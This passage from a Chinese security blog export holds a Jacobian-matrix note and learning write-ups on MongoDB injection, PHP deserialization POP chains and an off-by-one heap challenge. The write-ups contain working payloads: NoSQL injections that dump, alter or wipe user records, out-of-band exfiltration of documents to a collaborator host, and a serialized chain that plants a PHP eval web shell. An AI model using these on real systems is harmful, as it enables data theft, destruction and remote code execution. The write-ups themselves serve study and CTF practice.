$ 对变量 $ x_j $ 的偏导数： $ [J_f(X)]_{i,j} = \\frac{\\partial f_i}{\\partial x_j}. $ 特殊情况 如果 $ f $ 是标量函数（即 $ m = 1 $ ），那么雅可比矩阵是一个 $ 1 \\times n $ 的行向量，称为函数 $ f $的 梯度向量 。 如果 $ f $ 是从 $ \\mathbb{R}^n \\to \\mathbb{R}^n $ 的向量函数（即 $ n = m $ ），则雅可比矩阵是一个方阵，常被用于研究 $ f $在点处的可逆性等性质。 几何意义 局部变化率与线性近似：雅可比矩阵定义了 $ f $ 在某一点的线性近似 。从泰勒展开的角度来看，如果 $ \\Delta $ 是自变量的小增量，那么： $ f(X + \\Delta X) \\approx f(X) + J_f(X) \\cdot \\Delta X. $ 其中 $ J_f(X) \\cdot \\Delta $ 表示由雅可比矩阵定义的线性部分。 方向导数：如果方向单位向量为 $ v \\in \\mathbb{R} $，那么 $ J_f(X) $ 是函数$ f $沿着方向 $ v $的变化率。 几何映射的局部行为：雅可比矩阵描述了映射 $f$ 在一点处的局部伸缩、旋转或反射 的性质： 如果 $ n = $ 且雅可比行列式（即 $ \\det(J_f(X) $）不为 0，则 $ f $ 在这一点处是局部的双射。 如果雅可比行列式为 0，则 $ f $ 在这一点可能是奇异的（不可逆）。 计算实例示例 1：标量情况函数 $ f(x,y) = x^2 + y^2 $，其雅可比矩阵是： $ J_f(x,y) = \\begin{bmatrix}\\frac{\\partial f}{\\partial x} &amp; \\frac{\\partial f}{\\partial y}\\end{bmatrix}= \\begin{bmatrix}2x &amp; 2y\\end{bmatrix}. $ 示例 2：向量情况定义 $ f(x,y,z) = \\begin{bmatrix} x^2y \\\\ yz \\\\ e^x+z \\end{bmatrix} $，则雅可比矩阵为： $ J_f(x,y,z) =\\begin{bmatrix}\\frac{\\partial f_1}{\\partial x} &amp; \\frac{\\partial f_1}{\\partial y} &amp; \\frac{\\partial f_1}{\\partial z} \\\\\\frac{\\partial f_2}{\\partial x} &amp; \\frac{\\partial f_2}{\\partial y} &amp; \\frac{\\partial f_2}{\\partial z} \\\\\\frac{\\partial f_3}{\\partial x} &amp; \\frac{\\partial f_3}{\\partial y} &amp; \\frac{\\partial f_3}{\\partial z}\\end{bmatrix} = \\begin{bmatrix}2xy &amp; x^2 &amp; 0 \\\\0 &amp; z &amp; y \\\\e^x &amp; 0 &amp; 1 \\\\\\end{bmatrix}. $","link":"/2025/03/04/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9B%85%E5%8F%AF%E6%AF%94%E7%9F%A9%E9%98%B5%EF%BC%88Jacobian-Matrix%EF%BC%89/"},{"title":"MONGODB注入学习","text":"写在前面 主要是对网上paper的一些总结以及最近遇到场景的一些总结。 千万不要用php7搭环境！千万不要用php7搭环境！千万不要用php7搭环境！ 对比一下代码量可以发现php7的mongodb扩展实在是太恶心了。所以不嫌麻烦的话建议用ubuntu14。 php5 1(new MongoClient())-&gt;{$db}-&gt;{$collection}-&gt;findOne(['_id' =&gt; $id]); php7 123$mongo = new MongoDB\\Driver\\Manager();$result = $mongo-&gt;executeQuery('db.collection', new MongoDB\\Driver\\Query(['_id'=&gt;$id], []), new MongoDB\\Driver\\ReadPreference(MongoDB\\Driver\\ReadPreference::RP_PRIMARY_PREFERRED));// 返回的$result是一个对象，需要手动转换成数组。 环境搭建 lamp环境 123sudo apt-get apache2sudo apt-get install php5 php-pear php5-devsudo apt-get install libsasl2-dev 安装php mongdb扩展 1pecl install mongodb 额外安装mongodb server，注意不要用apt-get自带的安装，那个版本貌似比较低，用不了简洁的php写法 12345wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.9.tgztar -zxvf mongodb-linux-x86_64-ubuntu1404-3.4.9.tgzcd mongodb-linux-x86_64-ubuntu1404-3.4.9/binsudo apt-get install mongodb-server 将extension=mongodb.so放入的php.ini中，因为装的apache故修改/etc/php/7.0/apache2 另外mongodb还有一个28017端口是mongodb的web管理接口 基本简单操作 切换或创建数据库 1use runoob 删除数据库 1db.dropDatabase() 创建集合 1db.site.insert(&quot;goole&quot;:&quot;www.google.com&quot;) 删除集合 1db.site.drop() 插入文档 1234db.users.insert({ username:&quot;cl0und&quot;, password:&quot;cl0und1pass&quot;}) 更新文档 update法 1db.site.update({'title':'MongoDB 教程'},{$set:{'title':'MongoDB'}}) save法 123456db.collection.save( &lt;document&gt;, { writeConcern: &lt;document&gt; }) 删除文档 1234567db.collection.remove( &lt;query&gt;, { justOne: &lt;boolean&gt;, writeConcern: &lt;document&gt; }) 主要说说查找 在我所见的paper中基本上都是讲通过查找注入。 1db.user.find({'id':{$gt:1}}) #从当前数据库的集合user中查找id大于1文档 可以发现查询的时候常常会用一些逻辑操作符，而一部分注入姿势就是由此而来的（下面会说到） gt 大于 {“field”: {$gt: value}} lt 小于 {“field”: {$lt: value}} gte 大于等于 {“field”: {$gte: value}} lte 小于等于 {“field”: {$lte: value}} ne 不等于 {“member.age”: {$ne: “mine”}} exists 存在与否 {“member”: {$exists: true}}} in 包含 {“member.age”: {$in: [null], “$exists: true”}} exists 存在与否 {“couponsCode.0”: {$exists: 1}} #数组存在第一条数据 or 或者 {“$or”: [{“member.age”: “23”}, {“member.name”: “23333”}]} and 并且 {“$and”: [{“member.age”: “23”}, {“member.name”: “23333”}]} regex 正则 ({“name”:{“$regex”:‘^a$’}}) size 个数 ({“name”:{“$size”:3}}) # $size name元素数为3 注入姿势 开始之前先写一点测试数据进mongodb 12345678910111213use testdb.users.insert({ username:&quot;cl0und&quot;, password:&quot;cl0und1pass&quot;})db.users.insert({ username:&quot;cl0und2&quot;, password:&quot;cl0und2pass&quot;})db.users.insert({ username:&quot;cl0und3&quot;, password:&quot;cl0und3pass&quot;}) 回显注入-数组绑定注入 偷了一个网上的脚本。可以把他看到成一个简单的登陆验证demo 1234567891011121314151617181920212223242526&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);error_reporting(E_ALL | E_STRICT);//echo extension_loaded(&quot;mongodb&quot;) ? &quot;loaded\\n&quot; : &quot;not loaded\\n&quot;;$mongo = new MongoClient();$db = $mongo-&gt;test; //选择数据库$coll = $db-&gt;users; //选择集合$username = $_GET['username'];$password = $_GET['password'];//var_dump($_GET);$data = array( 'username'=&gt;$username, 'password'=&gt;$password );$data = $coll-&gt;find($data);$count = $data-&gt;count();if ($count&gt;0) { foreach ($data as $user) { echo 'username:'.$user['username'].&quot;&lt;/br&gt;&quot;; echo 'password:'.$user['password'].&quot;&lt;/br&gt;&quot;; }}else{ echo '未找到';}?&gt; 正常url http://192.168.62.151/mongo.php?username=cl0und&amp;password=cl0und1pass 相当于执行了 1db.users.find({username:&quot;cl0und&quot;,password:&quot;cl0und1pass&quot;}) 那么结合php可以传数组的特性可以 注入url http://192.168.62.151/mongo.php?username[$ne]=cl0und&amp;password[$ne]=cl0und1pass 相当于执行了 1db.users.find({username:{$ne:&quot;cl0und&quot;},password:{$ne:&quot;cl0und1pass&quot;}}) 这样通过数组的嵌套成功的改变了代码执行的逻辑，下面的例子来自于一次做题 这里要通过员工的工号才能注册，但是在不知道工号情况下可以尝试注入。抓包可以发现数据是以json格式上传的，以及之前步骤的一些提示可以猜到后台数据库是以mongodb。因为2333这个工号不存在，而jobnumber这个点又有注入，所以成功绕过注册限制。 回显注入-字符串拼接注入 这种注入特点和传统的sql注入类似，因为程序员直接拼接的sql语句，造成代码与数据边界不清。因为mongoddb是用js来操作的，所以注入语句符合js语法就好。偷脚本 123456789101112131415161718&lt;?php$username = $_GET['username'];$password = $_GET['password'];$query = &quot;var data = db.users.findOne({username:'$username',password:'$password'});return data;&quot;;$mongo = new mongoclient();$db = $mongo-&gt;test;$data = $db-&gt;execute($query);if ($data['ok'] == 1) { if ($data['retval']!=NULL) { echo 'username:'.$data['retval']['username'].&quot;&lt;/br&gt;&quot;; echo 'password:'.$data['retval']['password'].&quot;&lt;/br&gt;&quot;; }else{ echo '未找到'; }}else{ echo $data['errmsg'];}?&gt; 网上的payload靠注释改变代码逻辑，但是实际使用不行，原因大概该是高版本不支持注释的原因 http://192.168.62.151/mongo.php?username=cl0und%27});return%20{username:1,password:2};//&amp;password=cl0und1pass1 可以改变策略闭合后面的代码 http://192.168.62.151/mongo.php?username=cl0und'});return ({username:1,password:2});var foo = ({'foo':'&amp;password=cl0und1pass1 然后后续步骤和sql注入类似 查看版本() http://192.168.62.151/mongo.php?username=cl0und'});return ({username:version(),password:2});var foo = ({'foo':' 查看当前数据库 http://192.168.62.151/mongo.php?username=cl0und'});return ({username:tojson(db),password:2});var foo = ({'foo':' 查看当前集合 http://192.168.62.151/mongo.php?username=cl0und'});return {username:tojson(db.getCollectionNames()),password:2};({foo:'1&amp;password=123456 查看文档 http://192.168.62.151/mongo.php?username=cl0und'});return {username:tojson(db.users.find()),password:2};({foo:'1&amp;password=123456 这里貌似一次性不能查看全部，这样会回显一些，看起来像是内部的脚本，暂时不知道是什么 需要一条一条的看 联想到多条语句执行，是不是可以插入数据？ http://192.168.62.151/mongo.php?username=cl0und'});db.users.insert({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({'foo':' 那还能删除数据 http://192.168.62.151/mongo.php?username=cl0und'});db.users.remove({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({'foo':' 还能删库跑路 http://192.168.62.151/mongo.php?username=cl0und'});db.users.remove({});var foo = ({'foo':' 更新别人密码 http://192.168.62.151/mongo.php?username=cl0und'});db.users.update({'username':'cl0und'},{$set:{'password':'hack'}});var foo = ({'foo':' 布尔盲注 以一个例子说明，注册一个用户名为cctrue,这里的功能是根据上传的用户名，查询所管理的机器（没有越权） 当传上去的用户名正常的时候 当不存在用户名，或者身份验证失败的时候 测试出注入点 盲注思路是用表达式的结果为true时和cc相加重新变成用户名ccture 确认版本信息 同样可以用于bool盲注还有$regix操作符 时间盲注 给个demo db.users.find({'$where':'function() {sleep(5000);}'}) 在数组绑定的代码下实验这个demo,发现因为mongodb或者php驱动的限制，不能正常用 http://192.168.62.151/mongo.php?username=cl0und&amp;password[$where]=function(){return%20sleep((5000);} 带外注入 实际没有用过，仅仅作一种探索 查看版本 db.copyDatabase('cl0und','test',version()+'.wssyoum9pyibk4uaukl9y0okxb31rq.burpcollaborator.net') 因为查询出来的json格式有和url标准冲突的特殊字符所以需要剔除，还有每个文档一般都会有一个 _id ,z这个id也往往不那么重要所以也可以剔除。在看文档的想找到mongodb有关base64或者16进制的字符串转换方法，不过很可惜没有找到，所以做了一下的折中处理。 db.copyDatabase('cl0und','test',tojson(db.users.findOne({},{_id:0})).replace(new RegExp(&quot;:| |,|\\&quot;|{|}&quot;,&quot;gm&quot;),&quot;&quot;)+'.e2hvfklnuw3ciolc2r4s9hd9o0uqif.burpcollaborator.net') 留坑 多个mongodb节点数据不一致性 CSRF 最后 寒假快乐 参考 http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/ https://www.owasp.org/index.php/Testing_for_NoSQL_injection","link":"/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"title":"POP链学习","text":"挖掘思路 能控制反序列化的点 反序列化类有魔术方法 魔术方法里有敏感操作（常规思路） 魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链） demo 来自的柠檬师傅博客，建议小伙伴们拿到自己先做一下，构造pop的方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }};class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace('\\n', $this-&gt;endl, $txt); return $txt; }};class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;E:\\\\WWW\\\\test\\\\ctf&quot; . $this-&gt;filename, $txt, FILE_APPEND); }};class Logger { protected $logwriter;//这里装入LogWriter_File对象 function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) {//这里偷梁换柱Song的log $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href='&quot; . $this-&gt;url . &quot;'&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }}class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href='song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;'&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }};class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) { $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE['lyrics'])) { return unserialize(base64_decode($_COOKIE['lyrics'])); } else { setcookie('lyrics', base64_encode(serialize(array(1, 2)))); return array(1, 2); } }};class Porter { static function exportData($lyrics) { return base64_encode(serialize($lyrics)); } static function importData($lyrics) { return serialize(base64_decode($lyrics)); }};class Conn { protected $conn; function __construct($dbuser, $dbpass, $db) { $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db); } function getLyrics($lyrics) { $r = array(); foreach ($lyrics as $lyric) { $s = intval($lyric); $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;); while (($row = $result-&gt;fetch_row()) != NULL) { $r []= unserialize(base64_decode($row[0])); } } return $r; } function addLyrics($lyrics) { $ids = array(); foreach ($lyrics as $lyric) { $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\\&quot;)&quot;); $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); } echo var_dump($ids); return $ids; } function __destruct() { $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; }};unserialize($_GET['cmd']); 操作过程 1、先找unserialize函数 在class user中有 12345678910111213141516171819class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE['lyrics'])) { $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics'])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie('lyrics', base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE['lyrics'])) { return unserialize(base64_decode($_COOKIE['lyrics'])); } else { setcookie('lyrics', base64_encode(serialize(array(1, 2)))); return array(1, 2); } }}; 我们看到$oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));里面cookie可控 那么问题来了，一个可控的unserialize点意味着什么？ 意味着你能控制{当前的定义的类或者自动加载能找到的类}的属性（这个对象属性当然可以是一个对象） 接着就可以寻找可以搞事的魔术方法，很快就会发现class Lyrics中有两个魔术方法 123456function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;;}function __destruct() { $this-&gt;song-&gt;log();} 我们发现两个魔术方法都没有什么敏感的操作，那么这个时候我们可以考虑构造POP链 通读代码可以发现程序员的本意是利用class song的log的方法，但是这个时候我们发现 class Logger也有log方法 123456789class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }}; 更加惊奇的是我们发现一个可以写文件的类这个类中方法writeLog 12345678910111213class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;E:\\\\WWW\\\\test\\\\ctf&quot; . $this-&gt;filename, $txt, FILE_APPEND); }}; 至此一条完整的POP链思路貌似出现在眼前 我们新建一个Lyrics对象将它的song属性填充成Logger对象,再把logger对象的logwriter的属性填充成LogWriter_File对象，最后传送给cookie,在Lyrics对象被销毁的时候就可以触发__destruct() 1234567&lt;?php$arr = array(new OutputFilter(&quot;//&quot;,&quot;&lt;?php eval(\\$_POST['c']);?&gt;&quot;));$obj1 = new LogFileFormat($arr,'\\n');$obj2 = new LogWriter_File(&quot;shell2333.php&quot;,$obj1);$obj3 = new Logger($obj2);$obj = new Lyrics(&quot;2333&quot;,$obj3);file_put_contents(&quot;serialize.txt&quot;, urlencode(serialize($obj))); serialize.txt可以找到这一坨 O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A4%3A%222333%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A13%3A%22shell2333.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A26%3A%22%3C%3Fphp+eval%28%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D GET一次，即可拿到shell 最后 记录一下反序列化注意点具体见Godot师傅 1、当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124) 2、CTF中成员属性数目前面多一个+可以绕过正则 3、protect属性和private会产生一些浏览器看不见的字符 4、会很有用的函数 get_included_files() , get_declared_classes() 5、如果通过上面的函数依然没有找到合适的类，可以尝试利用spl_autoload_register 6、session序列化反序列化机制不同造成漏洞 最最后 无意间在看php文档的时候发现一个5.6.x后废弃的特性，叫做 ，功能是在上下文语境中可以调用用类::的模式调用非静态方法(?)，一个demo如下 最最最后 如有问题请指教 国庆快乐！","link":"/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"title":"PWN 堆利用 off-by-one NULL byte - b00ks writeup","text":"最新刚开始学pwn，还不熟悉ida和gdb。此篇记录了off-by-one b00ks上这道题的复现，从ida/gdb使用到payload编写。文中有一些内存分布图片偷懒我没有自己画，引用自这篇文章（写的很好）。侵删。 基本信息检查 程序入口点分析 静态方法拿到程序入口 动态方法 start 功能：start命令用于加载程序并在程序的 main 函数的第一条语句之前设置一个临时断点。代码会执行到 main 函数启动之前，然后暂停，让你可以进行调试设置。 典型场景：start命令通常用于希望程序在还没有开始主要逻辑之前能暂停下来，让调试者有机会设置其他断点或检查初始状态。 入口指令恢复 这里看到IDA有一个错误的反编译，它把代码搞成了数据，选中这一段用 Undefine（快捷键 U），它会取消对该区域的数据显示。 在取消定义后，右键点击同一区域。选择 Code（快捷键 C），这将告诉 IDA Pro 重新识别该区域为代码。 右键点击选择 Code 或按 C 键，选force，重新将选中的区域转换为代码。 确定main函数 根据LIBC_START_MAIN的函数原型我们可以知道，第一个参数是main函数的地址 -&gt; cs:11CFh 123456789101112//glibc-2.24 ./csu/libc-start.cSTATIC int LIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL), int argc, char **argv,#ifdef LIBC_START_MAIN_AUXVEC_ARG ElfW(auxv_t) *auxvec,#endif __typeof (main) init, void (*fini) (void), void (*rtld_fini) (void), void *stack_end) 由此找到main函数 在光标位于 011CF 地址上时，按下快捷键 N，会弹出一个对话框。输入 main 并确认。 代码阅读与函数名恢复 banner(sub_A77) 我们一个一个来看，sub_A77输出banner信息，重命名为banner edit_author_name(sub_B6D) 需要用户输入author name，重命名为edit_author_name create_book(sub_F55) sub_F55是在创建书，重命名为create book delete_book(sub_BBD) sub_BBD是在删除书，重命名为delete_book edit_book(sub_E17) sub_E17在修改book, edit_book list_book(sub_D1F) 在输出所有书籍信息, list_book menu(sub_A89) sub_A89给出了选项，根据用户不同输出跳转到上面的各个子功能。重命名为menu 最后main被润色成如下 细读子功能 create_book 用户先输入一个size，然后malloc指定用户输入的size的大小 123456789101112131415161718signed __int64 sub_F55(){ int v1; // [rsp-28h] [rbp-28h] int v2; // [rsp-24h] [rbp-24h] _DWORD *v3; // [rsp-20h] [rbp-20h] _BYTE *v4; // [rsp-18h] [rbp-18h] _BYTE *v5; // [rsp-10h] [rbp-10h] v1 = 0; printf(&quot;\\nEnter book name size: &quot;, *(_QWORD *)&amp;v1); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &gt;= 0 ) { printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;v1); v4 = malloc(v1); if ( v4 ) { if ( (unsigned int)sub_9F5(v4, v1 - 1) ) 接着调用sub_9F5，让我们细看一下sub_9F5的作用，这里它循环读取用户输入内容并且赋值给刚才malloc的那块内存。 123456789101112131415161718192021signed __int64 __fastcall sub_9F5(_BYTE *a1, int a2){ int i; // [rsp-14h] [rbp-14h] _BYTE *v4; // [rsp-10h] [rbp-10h] if ( a2 &lt;= 0 ) return 0LL; v4 = a1; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, v4, 1uLL) != 1 ) return 1LL; if ( *v4 == 10 ) break; ++v4; if ( i == a2 ) break; } *v4 = 0; return 0LL;} 我们重名为scan_user_input。举个例子如果用户输入32, 那么就会调用scan_user_input(v4, 31)。scan_user_input内部循环从0读到31并且在第32位添加0，注意这里其实是一个 off -by-one NULL byte问题，用户申请32的空间，实际写入了33个字符。 如果一切回继续进入else部分 1234567891011121314151617181920212223else{ v2 = sub_B24(); if ( v2 == -1 ) { printf(&quot;Library is full&quot;); } else { v3 = malloc(0x20uLL); if ( v3 ) { v3[6] = v1; *((_QWORD *)off_202010 + v2) = v3; *((_QWORD *)v3 + 2) = v5; *((_QWORD *)v3 + 1) = v4; *v3 = ++unk_202024; return 0LL; } printf(&quot;Unable to allocate book struct&quot;); }} 调用sub_B24 123456789101112signed __int64 sub_B24(){ __int64 v1; // [rsp-8h] [rbp-8h] *((_DWORD *)&amp;v1 - 1) = 0; for ( *((_DWORD *)&amp;v1 - 1) = 0; *((_DWORD *)&amp;v1 - 1) &lt;= 19; ++*((_DWORD *)&amp;v1 - 1) ) { if ( !*((_QWORD *)off_202010 + *((signed int *)&amp;v1 - 1)) ) return *((unsigned int *)&amp;v1 - 1); } return 0xFFFFFFFFLL;} 结合后面*((_QWORD *)off_202010 + v2) = v3分析，off_202010其实是一个数组（书柜）用来放置book对象的指针，循环遍历这个数字，如果数组对应下标为空，那么说明书柜有空位，返回对应下标，否则返回-1（-1的反码为0xFFFFFFFFLL）把sub_B24命名为check_space。 一旦有space就会给book对象malloc一个空间，稍微美化一下，容易看出在源码中book应该是一个结构体 1234567891011book = malloc(0x20uLL);if ( book ){ book[6] = desc_size; *((_QWORD *)bookshelf + idx) = book; *((_QWORD *)book + 2) = book_desc; *((_QWORD *)book + 1) = book_name; *book = ++unk_202024; return 0LL;}printf(&quot;Unable to allocate book struct&quot;); 不过这里反编译的仍然很混乱，unk_202024应该是一个int, book + 1, book + 2应该是两个8字节的指针，为什么放size的时候突然发到book[6]了？book这里一个item的大小究竟是多少？ 我们回到这部分汇编再看一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:00000000000010FA.text:00000000000010FA loc_10FA: ; CODE XREF: create_book+18D↑j.text:00000000000010FA mov edi, 20h ; ' ' ; size.text:00000000000010FF call _malloc.text:0000000000001104 mov [rbp-18h], rax.text:0000000000001108 cmp qword ptr [rbp-18h], 0.text:000000000000110D jnz short loc_1122.text:000000000000110F lea rdi, large cs:1618h ; &quot;Unable to allocate book struct&quot;.text:0000000000001116 mov eax, 0.text:000000000000111B call _printf.text:0000000000001120 jmp short loc_118F.text:0000000000001122 ; ---------------------------------------------------------------------------.text:0000000000001122.text:0000000000001122 loc_1122: ; CODE XREF: create_book+1B8↑j.text:0000000000001122 mov eax, [rbp-20h] //这里里面放的是desc size的值.text:0000000000001125 mov edx, eax.text:0000000000001127 mov rax, [rbp-18h] //rax放置book对象指针地址.text:000000000000112B mov [rax+18h], edx //把edx赋值给book对象的第一个值，这个值是一个4字节的值.text:000000000000112E lea rax, bookshelf //把存放bookshelf数组地址的那个地址传入.text:0000000000001135 mov rax, [rax] //拿到bookshelf数组的起始地址.text:0000000000001138 mov edx, [rbp-1Ch] //把idx放到edx里面.text:000000000000113B movsxd rdx, edx //把idx字节的值保留符号扩展到8字节.text:000000000000113E shl rdx, 3 //把idx右移动3位相当于idx * 8 -&gt; 移动到指针的距离.text:0000000000001142 add rdx, rax //rdx = bookshelf + idx * 8.text:0000000000001145 mov rax, [rbp-18h] //rax = book地址.text:0000000000001149 mov [rdx], rax //[bookshelf + idx * 8] = book地址.text:000000000000114C mov rax, [rbp-18h] //rax = book地址.text:0000000000001150 mov rdx, [rbp-8] //这里放的是desc指针.text:0000000000001154 mov [rax+10h], rdx //[book+0x10] = desc指针.text:0000000000001158 mov rax, [rbp-18h] //rax放置book对象指针地址.text:000000000000115C mov rdx, [rbp-10h] //[rbp-10h]的值name的指针.text:0000000000001160 mov [rax+8], rdx //[book + 0x8] = name的指针.text:0000000000001164 lea rax, unk_202024 // rax = unk_202024.text:000000000000116B mov eax, [rax] // eax = [unk_202024].text:000000000000116D lea edx, [rax+1] // edx = [unk_202024] + 1.text:0000000000001170 lea rax, unk_202024 // rax = [unk_202024].text:0000000000001177 mov [rax], edx // [unk_202024] = [unk_202024] + 1.text:0000000000001179 lea rax, unk_202024 // rax = unk_202024.text:0000000000001180 mov edx, [rax] // edx = [unk_202024].text:0000000000001182 mov rax, [rbp-18h] // rax = book.text:0000000000001186 mov [rax], edx //*book = 4字节宽度的 unk_202024.text:0000000000001188 mov eax, 0 .text:000000000000118D jmp short locret_11CD.text:000000000000118F ; ---------------------------------------- 综上 1234book + 0x18h = desc_sziebook + 0x8h = name指针book + 0x10h = desc 指针book + 0x0h = int number 可见ida的反汇编结果不太准确。book结构体正确的偏移应该是。 12340-4 int8-16 ptr16-24 ptr24-28 int 123456struct book { int id; char *name; //因为对齐会占到8 char *description; int description_size;} book; 在ida中创建结构体 这下就对味了, malloc完堆布局如下。 细说利用 (泄漏libc地址) bookshelf数组里面放着第一个book的指针 (0x0000555555603710) Bookshelf和off_202018(author name相邻) 1234.data:0000000000202010 bookshelf dq offset unk_202060 ; DATA XREF: check_space:loc_B38↑o.data:0000000000202010 ; delete_book:loc_C1B↑o ....data:0000000000202018 off_202018 dq offset unk_202040 ; DATA XREF: edit_author_name+15↑o.data:0000000000202018 ; list_book+CA↑o 12345678910111213141516gef➤ heap chunksChunk(addr=0x555555603010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x0000555555603010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................]Chunk(addr=0x5555556032a0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x00005555556032a0 33 32 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 32..............]Chunk(addr=0x5555556036b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x00005555556036b0 61 61 61 61 61 